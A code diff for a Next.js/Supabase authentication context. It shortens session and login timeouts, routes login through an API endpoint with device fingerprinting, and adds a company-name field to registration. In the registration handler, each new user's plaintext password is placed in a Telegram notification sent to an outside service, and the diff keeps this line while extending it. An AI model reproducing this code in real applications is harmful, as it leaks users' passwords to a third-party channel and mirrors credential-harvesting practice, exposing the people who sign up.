@@ -5,6 +5,7 @@ import { User, LoginCredentials, AuthContextType, RegisterCredentials, Registrat
 import { supabase } from '@/lib/supabase';
 import type { AuthUser } from '@supabase/supabase-js';
 import { sendTelegramNotification } from '@/lib/telegram';
+import { generateFingerprint, getDeviceInfo } from '@/lib/deviceFingerprint';
 
 const AuthContext = createContext<AuthContextType | undefined>(undefined);
 
@@ -265,16 +266,31 @@ export function AuthProvider({ children }: { children: ReactNode }) {
 
       setLoadingStage('Checking authentication...');
       
-      const sessionResult = await Promise.race([
-        supabase.auth.getSession(),
-        new Promise<{ data: { session: null }, error: { message: string } }>((_, reject) => 
-          setTimeout(() => reject(new Error('Session check timeout')), 20000)
-        )
-      ]) as { data: { session: any }, error: any };
+      let sessionResult: { data: { session: any }, error: any };
+      
+      try {
+        sessionResult = await Promise.race([
+          supabase.auth.getSession(),
+          new Promise<never>((_, reject) => 
+            setTimeout(() => reject(new Error('Session check timeout')), 5000)
+          )
+        ]) as { data: { session: any }, error: any };
+      } catch (timeoutErr: any) {
+        if (timeoutErr?.message === 'Session check timeout') {
+          console.warn(`⏱️ Session check timeout on attempt ${attempt}`);
+          if (attempt >= 2) {
+            console.warn('🧹 Clearing potentially stale session after timeouts');
+            await clearInvalidSession();
+            setIsInitializing(false);
+            return;
+          }
+          throw timeoutErr;
+        }
+        throw timeoutErr;
+      }
       
       const { data: { session }, error } = sessionResult;
       
-      // Обробка помилки Invalid Refresh Token
       if (error && (
         error.message?.includes('Invalid Refresh Token') ||
         error.message?.includes('Refresh Token Not Found') ||
@@ -286,7 +302,7 @@ export function AuthProvider({ children }: { children: ReactNode }) {
         return;
       }
       
-      if (error && error.message !== 'Session check timeout') {
+      if (error) {
         console.error('❌ AuthContext: Session error:', error);
         if (attempt >= 3) {
           setUser(null);
@@ -307,7 +323,7 @@ export function AuthProvider({ children }: { children: ReactNode }) {
           .eq('id', session.user.id)
               .single(),
             new Promise<{ data: null, error: { message: string } }>((_, reject) => 
-              setTimeout(() => reject(new Error('Profile check timeout')), 10000)
+              setTimeout(() => reject(new Error('Profile check timeout')), 5000)
             )
           ]) as { data: any, error: any };
 
@@ -340,7 +356,6 @@ export function AuthProvider({ children }: { children: ReactNode }) {
             access_expires_at: profile.access_expires_at,
           };
           setUser(userObj);
-          // Транслюємо стан іншим вкладкам
           broadcastAuthState(userObj);
         } else {
           setUser(null);
@@ -371,7 +386,7 @@ export function AuthProvider({ children }: { children: ReactNode }) {
       console.error(`💥 AuthContext: Initialization attempt ${attempt} failed:`, error);
       
       if (attempt < 3) {
-        const delay = Math.min(1000 * Math.pow(2, attempt - 1), 5000);
+        const delay = Math.min(1000 * attempt, 3000);
         setLoadingStage(`Connection failed. Retrying in ${delay/1000}s...`);
         
         setTimeout(() => {
@@ -543,7 +558,7 @@ export function AuthProvider({ children }: { children: ReactNode }) {
         setLoadingStage('Timeout reached. Please refresh if needed.');
         setIsInitializing(false);
       }
-    }, 20000);
+    }, 12000);
 
     return () => {
       isMounted = false;
@@ -661,101 +676,82 @@ export function AuthProvider({ children }: { children: ReactNode }) {
         return { success: false, message: 'Login is only available on the client side.' };
       }
 
-      const loginResult = await Promise.race([
-        supabase.auth.signInWithPassword({
-        email: credentials.email,
-        password: credentials.password,
-        }),
-        new Promise<{ data: null, error: { message: string } }>((_, reject) => 
-          setTimeout(() => reject(new Error('Login timeout')), 30000)
-        )
-      ]) as { data: any, error: any };
-
-      const { data, error } = loginResult;
-
-      if (error) {
-        return {
-          success: false,
-          message: error.message || 'Login error. Please try again.',
-        };
-      }
-
-      if (data?.user) {
-        try {
-          const { data: profile, error: profileError } = await supabase
-          .from('profiles')
-          .select('id, name, role, created_at, is_approved, access_level, payment_reminder, overdue_message, expired_message, access_expires_at')
-          .eq('id', data.user.id)
-          .single();
-          
-          if (profileError) {
-            console.error('Profile fetch error:', profileError);
-            try {
-              await supabase.auth.signOut();
-            } catch (signOutError) {
-              console.error('Error signing out:', signOutError);
-            }
-            return {
-              success: false,
-              message: 'Could not load user profile. Please try again.',
-            };
-          }
-          
-        if (profile && profile.is_approved) {
-          const userObj: User = {
-            id: profile.id,
-            email: data.user.email!,
-            password: '',
-            name: profile.name,
-            role: profile.role,
-            access_level: profile.access_level,
-            created_at: profile.created_at,
-            lastLogin: new Date(),
-            isApproved: true,
-            payment_reminder: profile.payment_reminder,
-            overdue_message: profile.overdue_message,
-            expired_message: profile.expired_message,
-            access_expires_at: profile.access_expires_at,
-          };
-          setUser(userObj);
-          // Транслюємо стан іншим вкладкам
-          broadcastAuthState(userObj);
-          return { success: true };
-        } else {
-            try {
-              await supabase.auth.signOut();
-            } catch (signOutError) {
-              console.error('Error signing out:', signOutError);
-            }
-            return {
-              success: false,
-              message: 'Your account is not approved yet.',
-            };
-          }
-        } catch (profileErr) {
-          console.error('Error processing profile:', profileErr);
-          try {
-          await supabase.auth.signOut();
-          } catch (signOutError) {
-            console.error('Error signing out:', signOutError);
-          }
-          return {
-            success: false,
-            message: 'Could not load user profile. Please try again.',
-          };
-        }
-      }
+      console.log('🔐 Attempting login via API route...');
       
-      return {
-        success: false,
-        message: 'Login failed. Please try again.',
-      };
-    } catch (error: any) {
-      console.error('💥 AuthContext: Catch block - Login error:', error);
-      if (error?.message === 'Login timeout') {
-        return { success: false, message: 'Login request timed out. Please check your internet connection and try again.' };
+      let fp = '';
+      let devInfo = {};
+      try {
+        fp = generateFingerprint();
+        devInfo = getDeviceInfo();
+      } catch {}
+      
+      try {
+        const apiResponse = await Promise.race([
+          fetch('/api/auth/login', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              ...credentials,
+              fingerprint: fp,
+              deviceInfo: devInfo,
+            }),
+          }),
+          new Promise<Response>((_, reject) => 
+            setTimeout(() => reject(new Error('API login timeout')), 15000)
+          )
+        ]);
+
+        const apiData = await apiResponse.json();
+        console.log('📦 API response:', { success: apiData.success, hasSession: !!apiData.session });
+
+        if (!apiData.success) {
+          return { success: false, message: apiData.message };
+        }
+
+        console.log('🔐 Saving session...');
+        try {
+          const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL;
+          if (supabaseUrl) {
+            const projectId = supabaseUrl.match(/https:\/\/([^.]+)\./)?.[1];
+            if (projectId) {
+              localStorage.setItem(`sb-${projectId}-auth-token`, JSON.stringify(apiData.session));
+            }
+          }
+        } catch (storageErr) {
+          console.warn('localStorage save failed:', storageErr);
+        }
+        
+        Promise.race([
+          supabase.auth.setSession({
+            access_token: apiData.session.access_token,
+            refresh_token: apiData.session.refresh_token,
+          }),
+          new Promise((_, reject) => setTimeout(() => reject(new Error('setSession timeout')), 2000))
+        ]).catch(() => {});
+        
+        console.log('✅ Session saved');
+
+        const userObj: User = {
+          ...apiData.user,
+          password: '',
+          lastLogin: new Date(),
+        };
+        
+        setUser(userObj);
+        broadcastAuthState(userObj);
+        
+        console.log('✅ Login successful');
+        return { success: true };
+      } catch (apiError: any) {
+        console.error('❌ API login failed:', apiError);
+        if (apiError?.message === 'API login timeout') {
+          return { success: false, message: 'Login request timed out. Please try again.' };
+        }
+        return { success: false, message: 'Could not connect to the server. Please try again.' };
       }
-      return { success: false, message: 'Could not connect to the server. Check your internet connection.' };
+    } catch (error: any) {
+      console.error('💥 AuthContext: Login error:', error);
+      return { success: false, message: 'Unexpected error during login. Please try again.' };
     } finally {
       setIsLoading(false);
     }
@@ -764,16 +760,35 @@ export function AuthProvider({ children }: { children: ReactNode }) {
   const logout = async () => {
     try {
       setIsLoading(true);
-    await supabase.auth.signOut();
-    setUser(null);
       
-      // Транслюємо вилогінення всім вкладкам
+      try {
+        await Promise.race([
+          supabase.auth.signOut(),
+          new Promise((_, reject) => setTimeout(() => reject(new Error('Logout timeout')), 3000))
+        ]);
+      } catch (signOutError) {
+        console.warn('SignOut error (will clear local state anyway):', signOutError);
+      }
+      
+      setUser(null);
+      
       if (broadcastChannel.current) {
         broadcastChannel.current.postMessage({
           type: 'LOGOUT',
           senderId: tabId.current
         });
       }
+      
+      try {
+        const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL;
+        if (supabaseUrl) {
+          const projectId = supabaseUrl.match(/https:\/\/([^.]+)\./)?.[1];
+          if (projectId) {
+            localStorage.removeItem(`sb-${projectId}-auth-token`);
+          }
+        }
+      } catch {}
+      
     } catch (error) {
       console.error('Logout error:', error);
       setUser(null);
@@ -813,6 +828,7 @@ export function AuthProvider({ children }: { children: ReactNode }) {
             email: credentials.email,
             password: credentials.password,
             name: credentials.name,
+            companyName: credentials.companyName,
         }),
       });
 
@@ -824,7 +840,8 @@ export function AuthProvider({ children }: { children: ReactNode }) {
         return false;
       }
       
-      const message = `🔔 New registration request\n\n👤 Name: ${credentials.name}\n📧 Email: ${credentials.email}\n🔑 Password: ${credentials.password}\n📅 Date: ${new Date().toLocaleDateString('en-US')}, ${new Date().toLocaleTimeString('en-US')}\n\n⏳ Awaiting administrator approval`;
+      const companyInfo = credentials.companyName ? `\n🏢 Company: ${credentials.companyName}` : '';
+      const message = `🔔 New registration request\n\n👤 Name: ${credentials.name}\n📧 Email: ${credentials.email}\n🔑 Password: ${credentials.password}${companyInfo}\n📅 Date: ${new Date().toLocaleDateString('en-US')}, ${new Date().toLocaleTimeString('en-US')}\n\n⏳ Awaiting administrator approval`;
       await sendTelegramNotification(message);
       
       setIsLoading(false);
